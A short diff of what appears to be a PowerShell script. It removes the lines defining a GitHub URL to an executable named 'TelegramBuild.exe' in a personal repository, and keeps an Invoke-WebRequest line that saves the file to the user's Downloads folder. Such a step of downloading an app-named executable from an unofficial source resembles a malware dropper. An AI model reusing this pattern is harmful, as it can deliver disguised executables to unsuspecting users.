@@ -1,7 +1,3 @@
-# --- Download the file from GitHub ---
-$githubUrl = "https://github.com/waed69/n/raw/refs/heads/main/TelegramBuild.exe"
-$destinationPath = "C:\Users\$env:USERNAME\Downloads\TelegramBuild.exe"
-
 Invoke-WebRequest -Uri $githubUrl -OutFile $destinationPath
 Start-Sleep -Seconds 4
 
